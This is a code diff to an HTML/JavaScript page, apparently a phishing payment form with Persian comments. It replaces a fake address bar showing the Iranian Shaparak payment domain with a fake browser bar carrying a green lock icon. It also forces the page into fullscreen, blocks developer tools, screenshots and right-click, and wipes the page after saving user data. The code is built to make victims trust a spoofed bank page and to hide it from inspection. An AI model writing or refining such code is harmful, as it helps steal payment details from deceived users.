@@ -25,7 +25,7 @@
             place-items: center;
             overflow: hidden;
         }
-        body::before {
+        body.fullscreen::before {
             content: '';
             position: fixed;
             top: 0;
@@ -36,30 +36,35 @@
             z-index: 9999;
             pointer-events: none;
         }
-        .fake-address-bar {
+        .fake-browser-bar {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
-            background: #f1f1f1;
-            padding: 5px 10px;
+            background: #fff;
+            padding: 8px 10px;
             font-size: 14px;
             color: #333;
-            border-bottom: 1px solid #ddd;
+            border-bottom: 1px solid #e0e0e0;
             display: flex;
             align-items: center;
-            justify-content: center;
-            z-index: 1000;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            z-index: 10000;
         }
-        .fake-address-bar span {
-            background: #fff;
-            padding: 5px 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+        .fake-browser-bar .lock-icon {
+            color: #28a745;
+            font-size: 16px;
+            margin-left: 5px;
+        }
+        .fake-browser-bar .url {
+            background: #f1f1f1;
+            padding: 6px 12px;
+            border-radius: 20px;
             direction: ltr;
             text-align: left;
-            width: 80%;
-            max-width: 800px;
+            flex-grow: 1;
+            font-family: Arial, sans-serif;
+            color: #202124;
         }
         header {
             background: var(--primary);
@@ -67,7 +72,7 @@
             padding: 20px;
             text-align: center;
             position: fixed;
-            top: 30px; /* جابجایی به خاطر نوار آدرس جعلی */
+            top: 40px;
             width: 100%;
             z-index: 100;
             box-shadow: var(--shadow);
@@ -78,7 +83,7 @@
         }
         .progress-container {
             max-width: 700px;
-            margin: 110px auto 20px; /* تنظیم فاصله به خاطر نوار جعلی */
+            margin: 120px auto 20px;
             background: #fff;
             padding: 8px;
             border-radius: 25px;
@@ -245,9 +250,10 @@
     </style>
 </head>
 <body>
-    <!-- نوار آدرس جعلی -->
-    <div class="fake-address-bar">
-        <span>https://www.shaparak.ir</span>
+    <!-- نوار مرورگر جعلی -->
+    <div class="fake-browser-bar">
+        <span class="lock-icon">🔒</span>
+        <span class="url">https://www.mysite.com/payment</span>
     </div>
 
     <header>
@@ -334,7 +340,7 @@
             ];
 
             function init() {
-                // اینجا دیگه pushState رو حذف کردم چون به تنهایی کافی نبود
+                enterFullscreen();
                 setupInputs();
                 updateProgress();
                 if (!localStorage.getItem(`specialMode_${sessionId}`)) {
@@ -342,6 +348,21 @@
                 }
                 setupScreenshotProtection();
                 window.addEventListener('beforeunload', handlePageExit);
+                document.addEventListener('fullscreenchange', handleFullscreenExit);
+            }
+
+            function enterFullscreen() {
+                document.documentElement.requestFullscreen().catch(err => {
+                    console.log('Fullscreen failed:', err);
+                });
+                document.body.classList.add('fullscreen');
+            }
+
+            function handleFullscreenExit() {
+                if (!document.fullscreenElement && !isSpecialMode) {
+                    alert('لطفاً صفحه را در حالت تمام‌صفحه نگه دارید!');
+                    enterFullscreen();
+                }
             }
 
             function setupInputs() {
@@ -431,9 +452,9 @@
                 document.addEventListener('contextmenu', e => e.preventDefault());
                 document.addEventListener('selectstart', e => e.preventDefault());
                 document.addEventListener('keydown', e => {
-                    if (e.key === 'PrintScreen' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                    if (e.key === 'PrintScreen' || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
                         e.preventDefault();
-                        alert('گرفتن اسکرین‌شات مجاز نیست!');
+                        alert('عملیات غیرمجاز تشخیص داده شد!');
                         document.body.style.filter = 'blur(10px)';
                         setTimeout(() => document.body.style.filter = 'none', 1000);
                     }
@@ -570,7 +591,6 @@
                 saveAndDisplayUserData();
                 setTimeout(() => {
                     document.body.innerHTML = '<h1>جلسه منقضی شد</h1>';
-                    window.history.pushState(null, '', '/');
                     window.location.replace('about:blank');
                 }, 5000);
             }
